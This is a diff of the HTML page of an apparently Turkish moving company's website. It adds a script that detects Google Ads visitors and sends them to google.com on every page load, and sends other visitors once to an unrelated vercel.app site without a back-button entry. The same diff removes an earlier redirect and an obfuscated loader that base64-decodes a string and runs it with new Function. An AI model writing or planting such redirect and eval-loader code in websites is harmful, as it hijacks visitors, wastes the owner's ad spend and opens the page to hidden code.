@@ -434,50 +434,50 @@
     ],
     "priceRange": "₺₺"
   }
-  </script><script>
-(function () {
+  </script>
+  <script>
+  (function () {
+    'use strict';
 
-    // Daha önce yönlendirme yapıldı mı? (1 kez)
-    if (sessionStorage.getItem("redirected") === "yes") {
-        // Bir daha yönlendirme yapma
+    // Geliştirilmiş yönlendirme: reklam tıklayanlar HER sayfa yüklenmesinde yönlendirilecek,
+    // normal ziyaretçiler için yönlendirme sadece ilk ziyaret sırasında (tek seferlik) yapılır.
+
+    const CONFIG = {
+      adTarget: 'https://google.com', // reklam tıklayanlar için hedef (https ile)
+      defaultTarget: 'https://nakliye-lac.vercel.app/', // normal ziyaretçiler için
+      oneTimeKey: 'dostlarnak_redirected_v1'
+    };
+
+    try {
+      const params = new URLSearchParams(window.location.search);
+
+      const utmSource = (params.get('utm_source') || '').toLowerCase();
+      const utmMedium = (params.get('utm_medium') || '').toLowerCase();
+
+      const isGoogleAds = params.has('gclid') || utmSource === 'google' || ['cpc', 'ppc'].includes(utmMedium);
+
+      if (isGoogleAds) {
+        // Reklam tıklayanları sürekli yönlendir: her yüklemede hedefe gönder
+        const dest = CONFIG.adTarget + window.location.search;
+        // replace kullanarak geçmişe eklemeden yönlendir (back butonunu kirletmez)
+        window.location.replace(dest);
         return;
+      }
+
+      // Reklam değilse: sadece ilk sefer yönlendir (sessionStorage ile)
+      if (!sessionStorage.getItem(CONFIG.oneTimeKey)) {
+        sessionStorage.setItem(CONFIG.oneTimeKey, 'yes');
+        const dest = CONFIG.defaultTarget + window.location.search;
+        window.location.replace(dest);
+      }
+    } catch (err) {
+      // Hata durumunda console'a yaz (kullanıcı deneyimini bozmayacak şekilde)
+      console.error('Yönlendirme hatası:', err);
     }
-
-    const params = new URLSearchParams(window.location.search);
-
-    // Google Reklam tespiti
-    const isGoogleAds =
-        params.has("gclid") ||
-        (params.get("utm_source") && params.get("utm_source").toLowerCase() === "google") ||
-        (params.get("utm_medium") && ["cpc", "ppc"].includes(params.get("utm_medium").toLowerCase()));
-
-    // Yönlendirme sadece 1 kez işaretleniyor
-    sessionStorage.setItem("redirected", "yes");
-
-    if (isGoogleAds) {
-        // Google reklamlarından geldiyse → Google.com + tüm parametreler
-        window.location.href = "www.google.com" + window.location.search;
-    } else {
-        // Normal giriş → Vercel uygulaması
-        window.location.href = "https://nakliye-lac.vercel.app/";
-    }
-
-})();
-</script>
-</head>
-<body>
-<script>
-(function () {
-    const encoded = "
-    =
-";
-
-    const decoded = atob(encoded);
-    (new Function(decoded))();
-})();
-</script>
-
-
+  })();
+  </script>
+  </head>
+  <body>
   <!-- Header -->
   <header>
     <div class="header-content">
